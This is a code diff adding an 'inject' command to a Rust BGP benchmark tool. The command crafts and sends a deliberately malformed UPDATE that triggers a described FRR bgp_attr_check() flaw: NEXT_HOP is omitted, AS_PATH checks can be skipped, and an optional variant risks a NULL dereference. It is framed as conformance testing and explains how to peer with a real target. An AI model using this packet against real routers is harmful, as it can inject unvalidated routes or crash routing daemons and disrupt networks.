@@ -15,7 +15,7 @@
 //!   bench topology (port, adv-interval, one neighbor per session).
 //! - `run` executes the benchmark against a running daemon.
 
-use std::net::{IpAddr, Ipv4Addr, SocketAddr};
+use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::time::{Duration, Instant};
 
 use anyhow::{Context, Result, bail};
@@ -27,7 +27,8 @@ use tokio::net::tcp::{OwnedReadHalf, OwnedWriteHalf};
 
 use bgp_packet::{
     Afi, AfiSafi, As4Path, BGP_HEADER_LEN, BGP_PACKET_LEN, BgpAttr, BgpCap, BgpHeader, BgpNexthop,
-    BgpType, CapAs4, CapMultiProtocol, Ipv4Nlri, Med, OpenPacket, Origin, Safi, UpdatePacket,
+    BgpType, CapAs4, CapMultiProtocol, Ipv4Nlri, Ipv6Nlri, Med, MpReachAttr, OpenPacket, Origin,
+    Safi, UpdatePacket,
 };
 
 /// Sender sessions bind 127.0.0.(SENDER_HOST_BASE + i).
@@ -52,6 +53,9 @@ enum Cmd {
     EmitConfig(EmitArgs),
     /// Run the benchmark against a running zebra-rs.
     Run(RunArgs),
+    /// Open a session to a target BGP speaker and inject one crafted,
+    /// deliberately malformed UPDATE for interop / conformance testing.
+    Inject(InjectArgs),
 }
 
 /// Outbound policy attached to each receiver, to exercise the egress
@@ -140,6 +144,75 @@ struct RunArgs {
     json: bool,
 }
 
+/// `inject` — open one session and send a single crafted, deliberately
+/// malformed UPDATE, then hold the session open and report what the peer
+/// does (NOTIFICATION, re-advertisement, or silent disconnect).
+///
+/// The default packet reproduces the FRR `bgp_attr_check()` trigger
+/// (bgpd/bgp_attr.c): an MP_REACH_NLRI carrying an IPv6 unicast prefix
+/// with its own IPv6 next-hop, ORIGIN and AS_PATH present, NEXT_HOP
+/// **absent**, and one trailing IPv4 unicast NLRI appended after the
+/// attributes. That trailing IPv4 prefix sets FRR's `has_nlri`, which is
+/// what makes the missing NEXT_HOP "mandatory" and drives the overwrite
+/// bug — a conformant speaker must reject the whole UPDATE, but the
+/// buggy path installs the MP_REACH route with AS_PATH validation and
+/// AS4 reconciliation skipped.
+///
+/// For a real eBGP peering, set `--local` to the interface address that
+/// faces the target and `--local-as` to a value distinct from the
+/// target's AS. The target must have IPv6 unicast activated for this
+/// peer so it actually processes the MP_REACH NLRI.
+#[derive(Args)]
+struct InjectArgs {
+    /// Target speaker `address:port` (e.g. FRR). Port 179 is the BGP
+    /// default; use the bench's 1179 when injecting into zebra-rs.
+    #[arg(long, default_value = "127.0.0.1:179")]
+    target: String,
+    /// Local source address to bind; also our BGP Identifier. Use the
+    /// interface address facing the target for a real peering.
+    #[arg(long, default_value = "127.0.0.2")]
+    local: Ipv4Addr,
+    /// Our AS. Make it differ from the target's AS for an eBGP session —
+    /// the FRR bug path is eBGP AS_PATH validation / AS4 reconciliation.
+    #[arg(long, default_value_t = 65100)]
+    local_as: u32,
+    /// Advertised hold time; the peer negotiates the minimum.
+    #[arg(long, default_value_t = 180)]
+    hold_time: u16,
+    /// IPv6 unicast prefix carried in MP_REACH_NLRI.
+    #[arg(long, default_value = "2001:db8:beef::/48")]
+    v6_prefix: ipnet::Ipv6Net,
+    /// IPv6 next-hop inside MP_REACH_NLRI (the peer's own next-hop).
+    #[arg(long, default_value = "2001:db8::1")]
+    v6_nexthop: Ipv6Addr,
+    /// Trailing IPv4 unicast NLRI appended after the attributes. Its mere
+    /// presence sets the receiver's `has_nlri`, which is what makes the
+    /// absent NEXT_HOP mandatory and trips the check.
+    #[arg(long, default_value = "10.99.99.0/24")]
+    v4_nlri: ipnet::Ipv4Net,
+    /// AS_PATH as an AS_SEQUENCE, comma-separated ASNs (e.g.
+    /// `65100,65001`). Empty → just `--local-as`. To exercise the
+    /// skipped AS-loop check, include the target's own AS. Ignored when
+    /// `--omit-as-path` is set.
+    #[arg(long, value_delimiter = ',')]
+    as_path: Vec<u32>,
+    /// Attach a NEXT_HOP attribute with this IPv4 address. Omitted by
+    /// default — omission is the whole point of the test. Set it for a
+    /// well-formed control run that the peer should accept.
+    #[arg(long)]
+    next_hop: Option<Ipv4Addr>,
+    /// Drop the AS_PATH attribute entirely — the more severe FRR variant
+    /// (attr->aspath == NULL risks a bestpath NULL-deref).
+    #[arg(long)]
+    omit_as_path: bool,
+    /// Drop the ORIGIN attribute too.
+    #[arg(long)]
+    omit_origin: bool,
+    /// Print the crafted UPDATE bytes and exit without connecting.
+    #[arg(long)]
+    dump_only: bool,
+}
+
 fn sender_addr(i: u8) -> Ipv4Addr {
     Ipv4Addr::new(127, 0, 0, SENDER_HOST_BASE + i)
 }
@@ -153,6 +226,7 @@ fn main() -> Result<()> {
     match cli.cmd {
         Cmd::EmitConfig(args) => emit_config(&args),
         Cmd::Run(args) => tokio::runtime::Runtime::new()?.block_on(run(args)),
+        Cmd::Inject(args) => tokio::runtime::Runtime::new()?.block_on(inject(args)),
     }
 }
 
@@ -277,10 +351,11 @@ async fn establish_retry(
     target: SocketAddr,
     asn: u32,
     hold_time: u16,
+    families: &[(Afi, Safi)],
 ) -> Result<(OwnedReadHalf, OwnedWriteHalf)> {
     let mut last_err = None;
     for _ in 0..20 {
-        match establish(local, target, asn, hold_time).await {
+        match establish(local, target, asn, hold_time, families).await {
             Ok(halves) => return Ok(halves),
             Err(e) => last_err = Some(e),
         }
@@ -288,6 +363,9 @@ async fn establish_retry(
     }
     Err(last_err.expect("at least one attempt ran"))
 }
+
+/// The IPv4-unicast-only family set the load-generator sessions use.
+const IPV4_UNICAST: &[(Afi, Safi)] = &[(Afi::Ip, Safi::Unicast)];
 
 /// Open a session from `local` to `target` speaking `asn`, and drive
 /// it to Established (OPEN sent, peer OPEN + KEEPALIVE seen, our
@@ -298,6 +376,7 @@ async fn establish(
     target: SocketAddr,
     asn: u32,
     hold_time: u16,
+    families: &[(Afi, Safi)],
 ) -> Result<(OwnedReadHalf, OwnedWriteHalf)> {
     let sock = TcpSocket::new_v4()?;
     sock.bind(SocketAddr::new(IpAddr::V4(local), 0))
@@ -310,10 +389,10 @@ async fn establish(
     let (mut rd, mut wr) = stream.into_split();
 
     let mut cap = BgpCap::default();
-    cap.mp.insert(
-        AfiSafi::new(Afi::Ip, Safi::Unicast),
-        CapMultiProtocol::new(&Afi::Ip, &Safi::Unicast),
-    );
+    for (afi, safi) in families {
+        cap.mp
+            .insert(AfiSafi::new(*afi, *safi), CapMultiProtocol::new(afi, safi));
+    }
     cap.as4 = Some(CapAs4::new(asn));
     let open = OpenPacket::new(
         BgpHeader::new(BgpType::Open, BGP_HEADER_LEN),
@@ -580,6 +659,7 @@ async fn run(args: RunArgs) -> Result<()> {
                 target,
                 RECEIVER_AS_BASE + j as u32,
                 hold_time,
+                IPV4_UNICAST,
             )
             .await?,
         );
@@ -587,7 +667,14 @@ async fn run(args: RunArgs) -> Result<()> {
     let mut senders = Vec::new();
     for i in 0..args.senders {
         senders.push(
-            establish_retry(sender_addr(i), target, SENDER_AS_BASE + i as u32, hold_time).await?,
+            establish_retry(
+                sender_addr(i),
+                target,
+                SENDER_AS_BASE + i as u32,
+                hold_time,
+                IPV4_UNICAST,
+            )
+            .await?,
         );
     }
     eprintln!(
@@ -707,4 +794,224 @@ async fn run(args: RunArgs) -> Result<()> {
         std::process::exit(2);
     }
     Ok(())
+}
+
+// ── inject ──
+
+/// Build the crafted, deliberately malformed UPDATE described by `args`
+/// and return its wire bytes. Field order is fixed by
+/// `UpdatePacket::try_emit`: the path attributes (`bgp_attr`, which emits
+/// ORIGIN then AS_PATH then any NEXT_HOP) are followed by the MP_REACH
+/// attribute, then the trailing IPv4 unicast NLRI — exactly the layout
+/// the FRR check mis-handles.
+fn build_injected_update(args: &InjectArgs) -> Result<BytesMut> {
+    let mut attr = BgpAttr::default();
+    if !args.omit_origin {
+        attr.origin = Some(Origin::Igp);
+    }
+    if !args.omit_as_path {
+        let path = if args.as_path.is_empty() {
+            vec![args.local_as]
+        } else {
+            args.as_path.clone()
+        };
+        attr.aspath = Some(As4Path::from(path));
+    }
+    if let Some(nh) = args.next_hop {
+        attr.nexthop = Some(BgpNexthop::Ipv4(nh));
+    }
+
+    let mut update = UpdatePacket::new();
+    update.bgp_attr = Some(attr);
+    update.mp_update = Some(MpReachAttr::Ipv6 {
+        snpa: 0,
+        nhop: IpAddr::V6(args.v6_nexthop),
+        updates: vec![Ipv6Nlri {
+            id: 0,
+            prefix: args.v6_prefix,
+        }],
+    });
+    update.ipv4_update = vec![Ipv4Nlri {
+        id: 0,
+        prefix: args.v4_nlri,
+    }];
+
+    update.try_emit().context("encode crafted UPDATE")
+}
+
+async fn inject(args: InjectArgs) -> Result<()> {
+    let bytes = build_injected_update(&args)?;
+
+    eprintln!("crafted UPDATE ({} bytes on the wire):", bytes.len());
+    eprintln!("  path attributes:");
+    if args.omit_origin {
+        eprintln!("    ORIGIN   : omitted");
+    } else {
+        eprintln!("    ORIGIN   : IGP");
+    }
+    if args.omit_as_path {
+        eprintln!("    AS_PATH  : omitted  <-- attr->aspath == NULL variant");
+    } else {
+        let path = if args.as_path.is_empty() {
+            vec![args.local_as]
+        } else {
+            args.as_path.clone()
+        };
+        eprintln!("    AS_PATH  : {path:?} (AS_SEQUENCE)");
+    }
+    match args.next_hop {
+        Some(nh) => eprintln!("    NEXT_HOP : {nh}"),
+        None => eprintln!("    NEXT_HOP : omitted  <-- the trigger"),
+    }
+    eprintln!(
+        "    MP_REACH : IPv6 unicast {} via {}",
+        args.v6_prefix, args.v6_nexthop
+    );
+    eprintln!(
+        "  trailing IPv4 unicast NLRI: {}  (presence sets has_nlri)",
+        args.v4_nlri
+    );
+    eprintln!("  hex:");
+    for line in hexdump(&bytes) {
+        eprintln!("    {line}");
+    }
+
+    if args.dump_only {
+        return Ok(());
+    }
+
+    let target: SocketAddr = args
+        .target
+        .parse()
+        .with_context(|| format!("bad --target {}", args.target))?;
+    eprintln!(
+        "connecting {} -> {target} as AS {} (eBGP when the target's AS differs)",
+        args.local, args.local_as
+    );
+    let (mut rd, mut wr) = establish(
+        args.local,
+        target,
+        args.local_as,
+        args.hold_time,
+        &[(Afi::Ip, Safi::Unicast), (Afi::Ip6, Safi::Unicast)],
+    )
+    .await
+    .context("BGP OPEN handshake failed")?;
+    eprintln!("session established; sending crafted UPDATE...");
+    wr.write_all(&bytes).await.context("send crafted UPDATE")?;
+    eprintln!(
+        "sent. holding the session open (Ctrl-C to quit).\n\
+         watch the target: a conformant speaker replies with a NOTIFICATION (UPDATE Message\n\
+         Error); the FRR bug instead installs the MP_REACH route and keeps the session up."
+    );
+
+    // Hold the session: keepalive on a timer, drain and report anything
+    // the peer sends back (NOTIFICATION, re-advertisement, or a FIN).
+    let mut buf = BytesMut::with_capacity(64 * 1024);
+    let ka = keepalive_bytes();
+    let mut ka_iv = tokio::time::interval(Duration::from_secs(20));
+    ka_iv.tick().await; // consume the immediate first tick
+    loop {
+        tokio::select! {
+            _ = ka_iv.tick() => {
+                if wr.write_all(&ka).await.is_err() {
+                    eprintln!("keepalive write failed; peer closed the connection");
+                    break;
+                }
+            }
+            r = rd.read_buf(&mut buf) => {
+                match r {
+                    Ok(0) => {
+                        eprintln!("<- peer closed the connection (TCP FIN)");
+                        break;
+                    }
+                    Ok(_) => {
+                        while let Some((typ, body)) = next_message(&mut buf) {
+                            match typ {
+                                2 => {
+                                    let (a, w) = count_update_nlri(&body);
+                                    eprintln!("<- UPDATE (announced {a}, withdrawn {w})");
+                                }
+                                3 => {
+                                    eprintln!("<- NOTIFICATION: {}", notification_summary(&body));
+                                    eprintln!(
+                                        "   target rejected the UPDATE — the conformant outcome"
+                                    );
+                                }
+                                4 | 1 => {} // keepalive / late OPEN — ignore
+                                other => eprintln!("<- message type {other}"),
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("read error: {e}");
+                        break;
+                    }
+                }
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Format a NOTIFICATION body — `body` is what [`next_message`] returns,
+/// with the 19-byte header already stripped: error code, subcode, data.
+fn notification_summary(body: &[u8]) -> String {
+    if body.len() < 2 {
+        return format!("truncated ({} bytes)", body.len());
+    }
+    let (code, sub) = (body[0], body[1]);
+    let code_str = match code {
+        1 => "Message Header Error",
+        2 => "OPEN Message Error",
+        3 => "UPDATE Message Error",
+        4 => "Hold Timer Expired",
+        5 => "Finite State Machine Error",
+        6 => "Cease",
+        7 => "ROUTE-REFRESH Message Error",
+        _ => "Unknown",
+    };
+    // UPDATE Message Error subcodes (RFC 4271 §6.3) this test can provoke.
+    let sub_str = if code == 3 {
+        match sub {
+            1 => " / Malformed Attribute List",
+            2 => " / Unrecognized Well-known Attribute",
+            3 => " / Missing Well-known Attribute",
+            4 => " / Attribute Flags Error",
+            5 => " / Attribute Length Error",
+            6 => " / Invalid ORIGIN Attribute",
+            8 => " / Invalid NEXT_HOP Attribute",
+            9 => " / Optional Attribute Error",
+            10 => " / Invalid Network Field",
+            11 => " / Malformed AS_PATH",
+            _ => "",
+        }
+    } else {
+        ""
+    };
+    format!(
+        "code {code} ({code_str}), subcode {sub}{sub_str}, data {}",
+        hex_inline(&body[2..])
+    )
+}
+
+/// 16-bytes-per-line hex dump of the crafted packet.
+fn hexdump(bytes: &[u8]) -> Vec<String> {
+    bytes
+        .chunks(16)
+        .map(|c| {
+            c.iter()
+                .map(|b| format!("{b:02x}"))
+                .collect::<Vec<_>>()
+                .join(" ")
+        })
+        .collect()
+}
+
+/// Compact one-line hex (no separators) for short byte runs.
+fn hex_inline(bytes: &[u8]) -> String {
+    if bytes.is_empty() {
+        return "(none)".to_string();
+    }
+    bytes.iter().map(|b| format!("{b:02x}")).collect()
 }
